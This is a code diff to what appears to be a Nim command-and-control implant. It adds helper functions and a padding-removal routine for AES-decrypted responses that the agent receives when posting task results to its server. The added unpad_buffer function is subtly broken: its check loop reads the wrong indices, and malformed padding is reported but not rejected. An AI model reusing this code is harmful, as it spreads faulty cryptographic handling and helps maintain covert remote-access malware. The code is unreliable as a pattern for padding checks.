@@ -11,6 +11,42 @@ when defined(AESPSK):
     from crypto import encryptStr,decryptStr
     from uri import decodeUrl
 
+func toByteSeq*(str: string): seq[byte] {.inline.} =
+  ## Converts a string to the corresponding byte sequence.
+  @(str.toOpenArrayByte(0, str.high))
+
+
+func toString*(bytes: openArray[byte]): string {.inline.} =
+  ## Converts a byte sequence to the corresponding string.
+  let length = bytes.len
+  if length > 0:
+    result = newString(length)
+    copyMem(result.cstring, bytes[0].unsafeAddr, length)
+
+proc unpad_buffer*(data: seq[byte], blockSize: uint): string = 
+  var buffer: seq[byte]
+  if blockSize < 1: 
+    when not defined(release):
+      echo "Block size looks wrong"
+    return toString(buffer)
+
+  if uint(len(data)) mod blockSize != 0:
+    when not defined(release):
+      echo "Data isn't aligned to blockSize"
+    return toString(buffer)
+        
+  let paddingLength = int(data[^1])
+  for i in 0..uint32(data[len(data) - paddingLength]):
+    let el = data[i]
+    if el != byte(paddingLength):
+      when not defined(release):
+        echo "Padding had malformed entries. Have: ",  $(paddingLength),  " expected: ",  $(el)
+      result = toString(buffer)
+
+  let num =  len(data) - paddingLength
+  result = toString(data[0..num-1])
+
+
 # TODO sort config
 proc Fetch*(curConfig: Config, bdata: string, isGet: bool): Future[string] {.async.} = 
     let dataToSend = when defined(AESPSK): encryptStr(curConfig.PayloadUUID, curConfig.Psk, bdata) else: bdata
@@ -152,7 +188,7 @@ proc postUp*(curConfig: Config, results: seq[Job]): Future[tuple[postupResp: str
                     # Indicates json response needs to be parsed for file_id
                     echo "your fetchdata: ", $(fetchData)
                     # echo "fetchdata decoded: ", decode(fetchData)
-                let parsedJson = when defined(AESPSK): parseJson(fetchData[36 .. ^1]) else: parseJson(decode(fetchData)[36 .. ^1]) 
+                let parsedJson = when defined(AESPSK): parseJson(unpad_buffer(toByteSeq(fetchData[36 .. ^1]),16)) else: parseJson(decode(fetchData)[36 .. ^1]) 
                 when not defined(release):
                     echo "parsedJson: ", $(parsedJson)
                 for resp in parsedJson["responses"].getElems():
